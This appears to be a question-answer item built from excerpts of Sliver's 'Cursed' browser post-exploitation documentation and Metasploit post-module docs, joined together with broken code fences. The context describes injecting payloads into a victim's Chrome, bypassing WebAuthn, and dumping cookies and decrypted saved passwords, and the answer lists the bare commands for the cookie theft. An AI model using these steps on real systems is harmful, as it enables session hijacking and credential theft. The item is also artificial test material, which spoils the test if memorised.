Context:Cursed is a Chrome/Chromium/Edge/Electron post-exploitation tool kit introduced in Sliver v1.5.25, which integrates with [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome) (originally [Sliver Overlord](https://github.com/BishopFox/sliver-overlord)). It can automatically find existing Chrome Extensions with the required permissions for [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome) and remotely inject it onto the target system, or you can start an interactive REPL to inject arbitrary code into any Chrome/Chromium/Edge/Electron context.  
Since web requests and other activity originate from the target machine/browser instance, Cursed Chrome and the Cursed tool kit are excellent options for bypassing U2F/Webauthn, hardware attestation, and geo-IP restrictions in web applications.  
## Cursed Chrome  
The `cursed chrome` command can be used to restart a remote system's Chrome browser with remote debugging enabled. If no payload is specified using `--payload` the command will simply restart Chrome with remote debugging enabled, you can then use `cursed console` to interact with any debug target.  
If a payload is specified, the command will restart Chrome with remote debugging, enumerate installed browser extensions, determine if any extension has the required permissions for [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome), and inject the payload into the extension's execution context.  
So a typical workflow looks like:  
1. Setup [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
2. Pop Sliver session, or go interactive from a beacon
3. `cursed chrome --payload background.js`
4. Upstream browser to CursedChrome proxy
5. Enjoy!  
## Cursed Edge  
Works identically to `cursed chrome` but the UI displays "Edge" instead of "Chrome" much like Edge itself.  
## Cursed Electron  
The `cursed electron` command can be used to restart an Electron application with remote debugging enabled, you can subsequently use `cursed console` to interact with any debug target. Note that some Electron applications disable the remote debugging functionality, which will prevent this feature from working.  
## Cursed Console  
The `cursed console` command can be used to start an interactive REPL with any cursed process. You will need to start a cursed process using `cursed chrome`, `cursed edge`, or `cursed electron` before using `cursed console`. You can list cursed processes using the `cursed` command. ![cursed](/images/cursed-1.png)  
## Cursed Cookies  
Starting in v1.5.28 the `cursed cookies` command can be used to dump a remote cursed process' cookies to a local file (newline delimited json), for example:  
```
[server] sliver (CHRONIC_GOAT) > cursed chrome

...

[server] sliver (CHRONIC_GOAT) > cursed cookies

? Select a curse: 44199  [Session 56a5cd6f]  /Applications/Google Chrome.app/Contents/MacOS/Google Chrome

[*] Successfully dumped 437 cookies
[*] Saved to cookies-20220925182151.json

### Usage  
There are two ways to launch a Post module, both require an existing session.  
Within a msf prompt you can use the `use` command followed by the `run` command to execute the module against the required session. For instance to extract credentials from Chrome on the most recently opened Metasploit session:  
```msf
msf6 > use post/windows/gather/enum_chrome
msf6 post(windows/gather/enum_chrome) > run session=-1 verbose=true

[*] Impersonating token: 7192
[*] Running as user 'DESKTOP-N3MAG5R\basic_user'...
[*] Extracting data for user 'basic_user'...
[+] Downloaded Web Data to '/Users/user/.msf4/loot/20220422122125_default_192.168.123.151_chrome.raw.WebD_560928.txt'
[-] Cookies not found
[+] Downloaded History to '/Users/user/.msf4/loot/20220422122126_default_192.168.123.151_chrome.raw.Histo_861946.txt'
[+] Downloaded Login Data to '/Users/user/.msf4/loot/20220422122126_default_192.168.123.151_chrome.raw.Login_785667.txt'
[+] Downloaded Bookmarks to '/Users/user/.msf4/loot/20220422122127_default_192.168.123.151_chrome.raw.Bookm_612993.txt'
[+] Downloaded Preferences to '/Users/user/.msf4/loot/20220422122127_default_192.168.123.151_chrome.raw.Prefe_893631.txt'
[*] Found password encrypted with masterkey
[+] Found masterkey!
[+] Decrypted data: url:http://192.168.123.6/ helloworld:157746edfe6b4d369d7e656c00eeb5c8
[+] Decrypted data: url:https://www.example.com/ my_username:my_password_123
[+] Decrypted data saved in: /Users/user/.msf4/loot/20220422122129_default_192.168.123.151_chrome.decrypted_981698.txt
[*] Post module execution completed
msf6 post(windows/gather/enum_chrome) >  
Or within a Meterpreter prompt use the `run` command, which will automatically set the module's session value:  
```msf
msf6 > sessions --interact -1
[*] Starting interaction with 5...

meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on DESKTOP-N3MAG5R

Installed Applications
======================

Name                                                                Version
----                                                                -------
7-Zip 21.07 (x64)                                                   21.07
Application Verifier x64 External Package                           10.1.19041.685
ClickOnce Bootstrapper Package for Microsoft .NET Framework         4.8.04162
DiagnosticsHub_CollectionService                                    16.1.28901
Docker Desktop                                                      2.2.0.4
... etc ..  
## Useful modules  
### Windows GPP Credentials  
This module enumerates the victim machine's domain controller and connects to it via SMB. It then looks for Group Policy Preference XML files containing local user accounts and passwords and decrypts them using Microsoft's public AES key. Cached Group Policy files may be found on end-user devices if the group policy object is deleted rather than unlinked  
```
use post/windows/gather/credentials/gpp
run session=-1
### Related Reading:  
- [[How to write a browser exploit using BrowserExploitServer]]

 Question: Provide only the commands to extract cookies using the cursed chrome and cursed cookies commands in Sliver. Exclude all explanations, output, and additional text.  

 Your response: 
```
[server] sliver (CHRONIC_GOAT) > cursed chrome
[server] sliver (CHRONIC_GOAT) > cursed cookies
```